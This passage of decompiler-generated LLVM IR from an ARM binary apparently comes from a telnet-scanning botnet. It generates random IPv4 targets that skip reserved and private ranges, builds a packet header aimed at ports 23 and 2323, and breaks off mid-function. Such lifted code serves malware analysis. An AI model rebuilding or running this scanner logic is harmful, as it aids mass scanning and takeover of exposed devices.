  store i32 %v4_edc4, i32* %r0.global-to-local, align 4
  %v2_edcc = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_edcc, i32* @lr, align 4
  %v1_f0f8 = add i32 %v2_edcc, 20
  %v1_f154 = add i32 %v2_edcc, 16
  %v2_f154 = inttoptr i32 %v1_f154 to i32*
  %v2_f3dc = ptrtoint i32* %stack_var_-40 to i32
  %v2_f424 = ptrtoint i32* %stack_var_-68 to i32
  %v2_f428 = ptrtoint i32* %stack_var_-224 to i32
  %v2_f42c = ptrtoint i32* %stack_var_-352 to i32
  %v2_fed4 = ptrtoint i32* %stack_var_-45 to i32
  %v2_fee8 = ptrtoint i32* %stack_var_-77 to i32
  %v2_fe40 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f674 = ptrtoint i32* %stack_var_-104 to i32
  %v2_10170 = ptrtoint i32* %stack_var_-96 to i32
  %v2_101c8 = ptrtoint i32* %stack_var_-42 to i32
  %v1_f164 = add i32 %v2_edcc, 9
  %v2_f164 = inttoptr i32 %v1_f164 to i8*
  %v1_f1f8 = add i32 %v2_edcc, 12
  %v2_f1f8 = inttoptr i32 %v1_f1f8 to i32*
  br label %dec_label_pc_edd4

dec_label_pc_edd4:                                ; preds = %dec_label_pc_f5c8, %dec_label_pc_ec38
  %stack_var_-1880.0 = phi i32 [ %tmp335, %dec_label_pc_ec38 ], [ %stack_var_-1880.1, %dec_label_pc_f5c8 ]
  store i32 ptrtoint (i32* @global_var_22284.140 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v2_eddc = load i32, i32* @global_var_22284.140, align 4
  store i32 %v2_eddc, i32* @r4, align 4
  %v3_ede0 = icmp uge i32 %stack_var_-1880.0, %v2_eddc
  store i1 %v3_ede0, i1* %cpsr_c.global-to-local, align 1
  %v9_ede0 = icmp eq i32 %stack_var_-1880.0, %v2_eddc
  store i1 %v9_ede0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ede0, label %dec_label_pc_f0e8, label %dec_label_pc_ede8

dec_label_pc_ede8:                                ; preds = %dec_label_pc_edd4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_10170, i32* @r5, align 4
  br label %dec_label_pc_edf8

dec_label_pc_edf8:                                ; preds = %bb408, %dec_label_pc_ede8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_ee0c = call i32 @rand_next()
  %v1_ee0c = trunc i32 %v0_ee0c to i16
  store i32 %v0_ee0c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24d4c.56 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22254.156 to i32), i32* %ip.global-to-local, align 4
  %v2_ee18 = load i32, i32* @global_var_24d4c.56, align 4
  store i32 %v2_ee18, i32* %r3.global-to-local, align 4
  store i16 %v1_ee0c, i16* bitcast (i32* @global_var_22258.161 to i16*), align 4
  store i32 %v2_ee18, i32* @global_var_22260.197, align 4
  br label %dec_label_pc_ee24

dec_label_pc_ee24:                                ; preds = %dec_label_pc_ef7c, %dec_label_pc_ee54, %dec_label_pc_efb0, %dec_label_pc_efa4, %dec_label_pc_ef98, %dec_label_pc_ef8c, %.thread47, %.thread31, %.thread27, %.thread23, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %dec_label_pc_eef0, %dec_label_pc_eee8, %bb384, %dec_label_pc_eeb8, %dec_label_pc_ee94, %bb377, %dec_label_pc_ee64, %bb376, %dec_label_pc_ee4c, %bb375, %bb399, %bb401, %dec_label_pc_edf8
  %v0_ee24 = call i32 @rand_next()
  store i32 %v0_ee24, i32* %r0.global-to-local, align 4
  %v1_ee28 = urem i32 %v0_ee24, 256
  store i32 %v1_ee28, i32* %r1.global-to-local, align 4
  %v3_ee2c = udiv i32 %v0_ee24, 256
  store i32 %v3_ee2c, i32* %r3.global-to-local, align 4
  %v3_ee30 = udiv i32 %v0_ee24, 65536
  store i32 %v3_ee30, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee34 = icmp eq i32 %v1_ee28, 0
  store i1 %v2_ee34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee34, label %bb375, label %bb374

bb374:                                            ; preds = %dec_label_pc_ee24
  %v3_ee38 = icmp ugt i32 %v1_ee28, 126
  store i1 %v3_ee38, i1* %cpsr_c.global-to-local, align 1
  %v8_ee38 = icmp eq i32 %v1_ee28, 127
  store i1 %v8_ee38, i1* %cpsr_z.global-to-local, align 1
  br label %bb375

bb375:                                            ; preds = %dec_label_pc_ee24, %bb374
  %v0_ee48 = phi i1 [ true, %dec_label_pc_ee24 ], [ %v8_ee38, %bb374 ]
  %v1_ee3c = urem i32 %v3_ee2c, 256
  store i32 %v1_ee3c, i32* %ip.global-to-local, align 4
  %v1_ee40 = urem i32 %v3_ee30, 256
  store i32 %v1_ee40, i32* %r2.global-to-local, align 4
  %v1_ee44 = and i32 %v0_ee24, 8388608
  %v2_ee44 = icmp ne i32 %v1_ee44, 0
  store i1 %v2_ee44, i1* %cpsr_c.global-to-local, align 1
  %v3_ee44 = udiv i32 %v0_ee24, 16777216
  store i32 %v3_ee44, i32* %r0.global-to-local, align 4
  br i1 %v0_ee48, label %dec_label_pc_ee24, label %dec_label_pc_ee4c

dec_label_pc_ee4c:                                ; preds = %bb375
  %v2_ee4c = icmp ugt i32 %v1_ee28, 2
  store i1 %v2_ee4c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee4c = icmp eq i32 %v1_ee28, 3
  store i1 %v7_ee4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee4c, label %dec_label_pc_ee24, label %dec_label_pc_ee54

dec_label_pc_ee54:                                ; preds = %dec_label_pc_ee4c
  %v1_ee54 = add nsw i32 %v1_ee28, -15
  store i32 %v1_ee54, i32* %r3.global-to-local, align 4
  %v2_ee58 = icmp ugt i32 %v1_ee28, 55
  store i1 %v2_ee58, i1* %cpsr_c.global-to-local, align 1
  %v7_ee58 = icmp eq i32 %v1_ee28, 56
  store i1 %v7_ee58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee58, label %dec_label_pc_ee24, label %bb376

bb376:                                            ; preds = %dec_label_pc_ee54
  %v3_ee5c = icmp ne i32 %v1_ee54, 0
  store i1 %v3_ee5c, i1* %cpsr_c.global-to-local, align 1
  %v8_ee5c = icmp eq i32 %v1_ee54, 1
  store i1 %v8_ee5c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee60 = xor i1 %v3_ee5c, true
  %v3_ee60 = or i1 %v8_ee5c, %v2_ee60
  br i1 %v3_ee60, label %dec_label_pc_ee24, label %dec_label_pc_ee64

dec_label_pc_ee64:                                ; preds = %bb376
  %v2_ee64 = icmp ugt i32 %v1_ee28, 9
  store i1 %v2_ee64, i1* %cpsr_c.global-to-local, align 1
  %v7_ee64 = icmp eq i32 %v1_ee28, 10
  store i1 %v7_ee64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee64, label %dec_label_pc_ee24, label %dec_label_pc_ee6c

dec_label_pc_ee6c:                                ; preds = %dec_label_pc_ee64
  %v2_ee6c = icmp ugt i32 %v1_ee28, 191
  store i1 %v2_ee6c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee6c = icmp eq i32 %v1_ee28, 192
  store i1 %v7_ee6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee6c, label %bb377, label %dec_label_pc_ee78

bb377:                                            ; preds = %dec_label_pc_ee6c
  %v3_ee70 = icmp ugt i32 %v1_ee3c, 167
  store i1 %v3_ee70, i1* %cpsr_c.global-to-local, align 1
  %v8_ee70 = icmp eq i32 %v1_ee3c, 168
  store i1 %v8_ee70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ee70, label %dec_label_pc_ee24, label %dec_label_pc_ee78

dec_label_pc_ee78:                                ; preds = %dec_label_pc_ee6c, %bb377
  %v7_ee78 = icmp eq i32 %v1_ee28, 172
  %.461 = zext i1 %v7_ee78 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_ee84 = icmp ugt i32 %v1_ee3c, 14
  store i1 %v2_ee84, i1* %cpsr_c.global-to-local, align 1
  %v7_ee84 = icmp eq i32 %v1_ee3c, 15
  store i1 %v7_ee84, i1* %cpsr_z.global-to-local, align 1
  %v2_ee88 = xor i1 %v2_ee84, true
  %v3_ee88 = or i1 %v7_ee84, %v2_ee88
  br i1 %v3_ee88, label %.thread7, label %bb380

.thread7:                                         ; preds = %dec_label_pc_ee78
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee9c

bb380:                                            ; preds = %dec_label_pc_ee78
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee8c = icmp eq i1 %v7_ee78, false
  store i1 %v2_ee8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee8c, label %dec_label_pc_ee9c, label %dec_label_pc_ee94

dec_label_pc_ee94:                                ; preds = %bb380
  %v2_ee94 = icmp ugt i32 %v1_ee3c, 30
  store i1 %v2_ee94, i1* %cpsr_c.global-to-local, align 1
  %v7_ee94 = icmp eq i32 %v1_ee3c, 31
  store i1 %v7_ee94, i1* %cpsr_z.global-to-local, align 1
  %v2_ee98 = xor i1 %v2_ee94, true
  %v3_ee98 = or i1 %v7_ee94, %v2_ee98
  br i1 %v3_ee98, label %dec_label_pc_ee24, label %dec_label_pc_ee9c

dec_label_pc_ee9c:                                ; preds = %.thread7, %dec_label_pc_ee94, %bb380
  %v7_ee9c = icmp eq i32 %v1_ee28, 100
  %.462 = zext i1 %v7_ee9c to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_eea8 = icmp ugt i32 %v1_ee3c, 62
  store i1 %v2_eea8, i1* %cpsr_c.global-to-local, align 1
  %v7_eea8 = icmp eq i32 %v1_ee3c, 63
  store i1 %v7_eea8, i1* %cpsr_z.global-to-local, align 1
  %v2_eeac = xor i1 %v2_eea8, true
  %v3_eeac = or i1 %v7_eea8, %v2_eeac
  br i1 %v3_eeac, label %.thread12, label %bb383

.thread12:                                        ; preds = %dec_label_pc_ee9c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eec0

bb383:                                            ; preds = %dec_label_pc_ee9c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eeb0 = icmp eq i1 %v7_ee9c, false
  store i1 %v2_eeb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eeb0, label %dec_label_pc_eec0, label %dec_label_pc_eeb8

dec_label_pc_eeb8:                                ; preds = %bb383
  %v2_eeb8 = icmp ugt i32 %v1_ee3c, 125
  store i1 %v2_eeb8, i1* %cpsr_c.global-to-local, align 1
  %v7_eeb8 = icmp eq i32 %v1_ee3c, 126
  store i1 %v7_eeb8, i1* %cpsr_z.global-to-local, align 1
  %v2_eebc = xor i1 %v2_eeb8, true
  %v3_eebc = or i1 %v7_eeb8, %v2_eebc
  br i1 %v3_eebc, label %dec_label_pc_ee24, label %dec_label_pc_eec0

dec_label_pc_eec0:                                ; preds = %.thread12, %dec_label_pc_eeb8, %bb383
  %v2_eec0 = icmp ugt i32 %v1_ee28, 168
  store i1 %v2_eec0, i1* %cpsr_c.global-to-local, align 1
  %v7_eec0 = icmp eq i32 %v1_ee28, 169
  store i1 %v7_eec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eec0, label %bb384, label %dec_label_pc_eecc

bb384:                                            ; preds = %dec_label_pc_eec0
  %v3_eec4 = icmp eq i32 %v1_ee3c, 255
  store i1 %v3_eec4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_eec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_eec4, label %dec_label_pc_ee24, label %dec_label_pc_eecc

dec_label_pc_eecc:                                ; preds = %dec_label_pc_eec0, %bb384
  %v7_eecc = icmp eq i32 %v1_ee28, 198
  %.463 = zext i1 %v7_eecc to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  %v2_eed8 = icmp ugt i32 %v1_ee3c, 16
  store i1 %v2_eed8, i1* %cpsr_c.global-to-local, align 1
  %v7_eed8 = icmp eq i32 %v1_ee3c, 17
  store i1 %v7_eed8, i1* %cpsr_z.global-to-local, align 1
  %v2_eedc = xor i1 %v2_eed8, true
  %v3_eedc = or i1 %v7_eed8, %v2_eedc
  br i1 %v3_eedc, label %.thread18, label %bb387

.thread18:                                        ; preds = %dec_label_pc_eecc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eef0

bb387:                                            ; preds = %dec_label_pc_eecc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eee0 = icmp eq i1 %v7_eecc, false
  store i1 %v2_eee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eee0, label %dec_label_pc_eef0, label %dec_label_pc_eee8

dec_label_pc_eee8:                                ; preds = %bb387
  %v2_eee8 = icmp ugt i32 %v1_ee3c, 18
  store i1 %v2_eee8, i1* %cpsr_c.global-to-local, align 1
  %v7_eee8 = icmp eq i32 %v1_ee3c, 19
  store i1 %v7_eee8, i1* %cpsr_z.global-to-local, align 1
  %v2_eeec = xor i1 %v2_eee8, true
  %v3_eeec = or i1 %v7_eee8, %v2_eeec
  br i1 %v3_eeec, label %dec_label_pc_ee24, label %dec_label_pc_eef0

dec_label_pc_eef0:                                ; preds = %.thread18, %dec_label_pc_eee8, %bb387
  %v2_eef0 = icmp ugt i32 %v1_ee28, 222
  store i1 %v2_eef0, i1* %cpsr_c.global-to-local, align 1
  %v7_eef0 = icmp eq i32 %v1_ee28, 223
  store i1 %v7_eef0, i1* %cpsr_z.global-to-local, align 1
  %v2_eef4 = xor i1 %v7_eef0, true
  %v3_eef4 = and i1 %v2_eef0, %v2_eef4
  br i1 %v3_eef4, label %dec_label_pc_ee24, label %dec_label_pc_eef8

dec_label_pc_eef8:                                ; preds = %dec_label_pc_eef0
  %v7_eef8 = icmp eq i32 %v1_ee28, 106
  %.464 = zext i1 %v7_eef8 to i32
  %v2_ef04 = icmp ugt i32 %v1_ee3c, 185
  store i1 %v2_ef04, i1* %cpsr_c.global-to-local, align 1
  %v7_ef04 = icmp eq i32 %v1_ee3c, 186
  store i1 %v7_ef04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef04, label %bb390, label %dec_label_pc_ef10

bb390:                                            ; preds = %dec_label_pc_eef8
  %v2_eef8 = icmp ugt i32 %v1_ee28, 105
  store i1 %v2_eef8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eef8, label %dec_label_pc_ee24, label %dec_label_pc_ef10

dec_label_pc_ef10:                                ; preds = %dec_label_pc_eef8, %bb390
  %v2_ef10 = icmp ugt i32 %v1_ee3c, 186
  store i1 %v2_ef10, i1* %cpsr_c.global-to-local, align 1
  %v7_ef10 = icmp eq i32 %v1_ee3c, 187
  store i1 %v7_ef10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef10, label %.thread23, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_ef10
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef24

.thread23:                                        ; preds = %dec_label_pc_ef10
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef1c = icmp eq i1 %v7_eef8, false
  store i1 %v2_ef1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef1c, label %dec_label_pc_ef24, label %dec_label_pc_ee24

dec_label_pc_ef24:                                ; preds = %.thread24, %.thread23
  %v2_ef24 = icmp ugt i32 %v1_ee3c, 184
  store i1 %v2_ef24, i1* %cpsr_c.global-to-local, align 1
  %v7_ef24 = icmp eq i32 %v1_ee3c, 185
  store i1 %v7_ef24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef24, label %.thread27, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_ef24
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef38

.thread27:                                        ; preds = %dec_label_pc_ef24
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef30 = icmp eq i1 %v7_eef8, false
  store i1 %v2_ef30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef30, label %dec_label_pc_ef38, label %dec_label_pc_ee24

dec_label_pc_ef38:                                ; preds = %.thread28, %.thread27
  %v2_ef38 = icmp ugt i32 %v1_ee3c, 183
  store i1 %v2_ef38, i1* %cpsr_c.global-to-local, align 1
  %v7_ef38 = icmp eq i32 %v1_ee3c, 184
  store i1 %v7_ef38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef38, label %.thread31, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_ef38
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef4c

.thread31:                                        ; preds = %dec_label_pc_ef38
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef44 = icmp eq i1 %v7_eef8, false
  store i1 %v2_ef44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef44, label %dec_label_pc_ef4c, label %dec_label_pc_ee24

dec_label_pc_ef4c:                                ; preds = %.thread32, %.thread31
  %v2_ef4c = icmp ugt i32 %v1_ee28, 149
  store i1 %v2_ef4c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef4c = icmp eq i32 %v1_ee28, 150
  store i1 %v7_ef4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef4c, label %bb391, label %dec_label_pc_ef58

bb391:                                            ; preds = %dec_label_pc_ef4c
  %v3_ef50 = icmp ugt i32 %v1_ee3c, 30
  store i1 %v3_ef50, i1* %cpsr_c.global-to-local, align 1
  %v8_ef50 = icmp eq i32 %v1_ee3c, 31
  store i1 %v8_ef50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef50, label %dec_label_pc_ee24, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %dec_label_pc_ef4c, %bb391
  %v2_ef58 = icmp ugt i32 %v1_ee28, 48
  store i1 %v2_ef58, i1* %cpsr_c.global-to-local, align 1
  %v7_ef58 = icmp eq i32 %v1_ee28, 49
  store i1 %v7_ef58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef58, label %bb392, label %dec_label_pc_ef64

bb392:                                            ; preds = %dec_label_pc_ef58
  %v3_ef5c = icmp ugt i32 %v1_ee3c, 50
  store i1 %v3_ef5c, i1* %cpsr_c.global-to-local, align 1
  %v8_ef5c = icmp eq i32 %v1_ee3c, 51
  store i1 %v8_ef5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef5c, label %dec_label_pc_ee24, label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ef58, %bb392
  %v2_ef64 = icmp ugt i32 %v1_ee28, 177
  store i1 %v2_ef64, i1* %cpsr_c.global-to-local, align 1
  %v7_ef64 = icmp eq i32 %v1_ee28, 178
  store i1 %v7_ef64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef64, label %bb393, label %dec_label_pc_ef70

bb393:                                            ; preds = %dec_label_pc_ef64
  %v3_ef68 = icmp ugt i32 %v1_ee3c, 61
  store i1 %v3_ef68, i1* %cpsr_c.global-to-local, align 1
  %v8_ef68 = icmp eq i32 %v1_ee3c, 62
  store i1 %v8_ef68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef68, label %dec_label_pc_ee24, label %dec_label_pc_ef70

dec_label_pc_ef70:                                ; preds = %dec_label_pc_ef64, %bb393
  %v2_ef70 = icmp ugt i32 %v1_ee28, 159
  store i1 %v2_ef70, i1* %cpsr_c.global-to-local, align 1
  %v7_ef70 = icmp eq i32 %v1_ee28, 160
  store i1 %v7_ef70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef70, label %bb394, label %dec_label_pc_ef7c

bb394:                                            ; preds = %dec_label_pc_ef70
  %v3_ef74 = icmp ugt i32 %v1_ee3c, 12
  store i1 %v3_ef74, i1* %cpsr_c.global-to-local, align 1
  %v8_ef74 = icmp eq i32 %v1_ee3c, 13
  store i1 %v8_ef74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef74, label %dec_label_pc_ee24, label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %dec_label_pc_ef70, %bb394
  %v1_ef7c = add nsw i32 %v1_ee28, -6
  store i32 %v1_ef7c, i32* %r3.global-to-local, align 4
  %v2_ef80 = icmp ugt i32 %v1_ee28, 10
  store i1 %v2_ef80, i1* %cpsr_c.global-to-local, align 1
  %v7_ef80 = icmp eq i32 %v1_ee28, 11
  store i1 %v7_ef80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef80, label %dec_label_pc_ee24, label %bb395

bb395:                                            ; preds = %dec_label_pc_ef7c
  %v3_ef84 = icmp ne i32 %v1_ef7c, 0
  store i1 %v3_ef84, i1* %cpsr_c.global-to-local, align 1
  %v8_ef84 = icmp eq i32 %v1_ef7c, 1
  store i1 %v8_ef84, i1* %cpsr_z.global-to-local, align 1
  %v2_ef88 = xor i1 %v3_ef84, true
  %v3_ef88 = or i1 %v8_ef84, %v2_ef88
  br i1 %v3_ef88, label %dec_label_pc_ee24, label %dec_label_pc_ef8c

dec_label_pc_ef8c:                                ; preds = %bb395
  %v2_ef8c = icmp ugt i32 %v1_ee28, 21
  store i1 %v2_ef8c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef8c = icmp eq i32 %v1_ee28, 22
  store i1 %v7_ef8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef8c, label %dec_label_pc_ee24, label %bb396

bb396:                                            ; preds = %dec_label_pc_ef8c
  %v3_ef90 = icmp ugt i32 %v1_ee28, 20
  store i1 %v3_ef90, i1* %cpsr_c.global-to-local, align 1
  %v8_ef90 = icmp eq i32 %v1_ee28, 21
  store i1 %v8_ef90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef90, label %dec_label_pc_ee24, label %dec_label_pc_ef98

dec_label_pc_ef98:                                ; preds = %bb396
  %v2_ef98 = icmp ugt i32 %v1_ee28, 27
  store i1 %v2_ef98, i1* %cpsr_c.global-to-local, align 1
  %v7_ef98 = icmp eq i32 %v1_ee28, 28
  store i1 %v7_ef98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef98, label %dec_label_pc_ee24, label %bb397

bb397:                                            ; preds = %dec_label_pc_ef98
  %v3_ef9c = icmp ugt i32 %v1_ee28, 25
  store i1 %v3_ef9c, i1* %cpsr_c.global-to-local, align 1
  %v8_ef9c = icmp eq i32 %v1_ee28, 26
  store i1 %v8_ef9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ef9c, label %dec_label_pc_ee24, label %dec_label_pc_efa4

dec_label_pc_efa4:                                ; preds = %bb397
  %v2_efa4 = icmp ugt i32 %v1_ee28, 29
  store i1 %v2_efa4, i1* %cpsr_c.global-to-local, align 1
  %v7_efa4 = icmp eq i32 %v1_ee28, 30
  store i1 %v7_efa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efa4, label %dec_label_pc_ee24, label %bb398

bb398:                                            ; preds = %dec_label_pc_efa4
  %v3_efa8 = icmp ugt i32 %v1_ee28, 28
  store i1 %v3_efa8, i1* %cpsr_c.global-to-local, align 1
  %v8_efa8 = icmp eq i32 %v1_ee28, 29
  store i1 %v8_efa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_efa8, label %dec_label_pc_ee24, label %dec_label_pc_efb0

dec_label_pc_efb0:                                ; preds = %bb398
  %v2_efb0 = icmp ugt i32 %v1_ee28, 54
  store i1 %v2_efb0, i1* %cpsr_c.global-to-local, align 1
  %v7_efb0 = icmp eq i32 %v1_ee28, 55
  store i1 %v7_efb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efb0, label %dec_label_pc_ee24, label %bb399

bb399:                                            ; preds = %dec_label_pc_efb0
  %v3_efb4 = icmp ugt i32 %v1_ee28, 32
  store i1 %v3_efb4, i1* %cpsr_c.global-to-local, align 1
  %v8_efb4 = icmp eq i32 %v1_ee28, 33
  store i1 %v8_efb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_efb4, label %dec_label_pc_ee24, label %dec_label_pc_efbc

dec_label_pc_efbc:                                ; preds = %bb399
  %v2_efbc = icmp ugt i32 %v1_ee28, 214
  store i1 %v2_efbc, i1* %cpsr_c.global-to-local, align 1
  %v7_efbc = icmp eq i32 %v1_ee28, 215
  store i1 %v7_efbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efbc, label %.thread47, label %bb400

bb400:                                            ; preds = %dec_label_pc_efbc
  %v3_efc0 = icmp ugt i32 %v1_ee28, 213
  store i1 %v3_efc0, i1* %cpsr_c.global-to-local, align 1
  %v8_efc0 = icmp eq i32 %v1_ee28, 214
  store i1 %v8_efc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_efc0, label %bb401, label %dec_label_pc_efd0

.thread47:                                        ; preds = %dec_label_pc_efbc
  br label %dec_label_pc_ee24

bb401:                                            ; preds = %bb400
  br label %dec_label_pc_ee24

dec_label_pc_efd0:                                ; preds = %bb400
  %v5_efdc = call i32 @llvm.bswap.i32(i32 %v0_ee24)
  store i32 %v5_efdc, i32* %r3.global-to-local, align 4
  %tmp402 = and i32 %v0_ee24, 65280
  %tmp403 = call i32 @llvm.bswap.i32(i32 %tmp402)
  %v3_efe4 = udiv i32 %v5_efdc, 16777216
  %tmp404 = and i32 %v0_ee24, 16711680
  %tmp405 = call i32 @llvm.bswap.i32(i32 %tmp404)
  %v4_efec = udiv i32 %tmp403, 256
  %v4_eff0 = mul nuw nsw i32 %tmp405, 256
  store i32 ptrtoint (i8** @global_var_22254.156 to i32), i32* @r0, align 4
  %tmp406 = and i32 %v0_ee24, 65536
  %v3_eff8 = icmp ne i32 %tmp406, 0
  store i1 %v3_eff8, i1* %cpsr_c.global-to-local, align 1
  %v4_eff8 = mul i32 %v5_efdc, 16777216
  %v5_efec = or i32 %v4_eff8, %v3_efe4
  %v5_eff0 = or i32 %v5_efec, %v4_efec
  %v5_eff8 = or i32 %v5_eff0, %v4_eff0
  store i32 %v5_eff8, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_2225e.198 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_eff8, i32* @global_var_22264.199, align 4
  %v3_f008 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_22254.156 to i32), i32 20)
  %v4_f008 = trunc i32 %v3_f008 to i16
  store i32 %v3_f008, i32* %r0.global-to-local, align 4
  %v3_f00c = load i32, i32* %stack_var_-52, align 4
  %v5_f01c = sdiv i32 %v3_f00c, 10
  %v3_f020 = mul i32 %v5_f01c, 8
  store i32 %v3_f020, i32* %r2.global-to-local, align 4
  %v2_f028 = mul i32 %v5_f01c, 10
  store i32 %v2_f028, i32* %r3.global-to-local, align 4
  %v3_f02c = icmp uge i32 %v3_f00c, %v2_f028
  store i1 %v3_f02c, i1* %cpsr_c.global-to-local, align 1
  %v9_f02c = icmp eq i32 %v3_f00c, %v2_f028
  store i1 %v9_f02c, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_22254.156 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_f02c, label %bb407, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_efd0
  store i32 ptrtoint (i16* @global_var_22268.159 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_f008, i16* bitcast (i32* @global_var_2225e.198 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_22254.156 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_22268.159 to i32), i32 2) to i16*), align 2
  %v4_f04c = load i32, i32* @global_var_22264.199, align 4
  store i32 %v4_f04c, i32* @global_var_2226c.201, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb408

bb407:                                            ; preds = %dec_label_pc_efd0
  store i16 %v4_f008, i16* bitcast (i32* @global_var_2225e.198 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_22254.156 to i32), i32* %r0.global-to-local, align 4
  %v4_f04c53 = load i32, i32* @global_var_22264.199, align 4
  store i32 ptrtoint (i16* @global_var_22268.159 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_f04c53, i32* @global_var_2226c.201, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_22268.159 to i32), i32 2) to i16*), align 2
  br label %bb408

bb408:                                            ; preds = %.thread59, %bb407
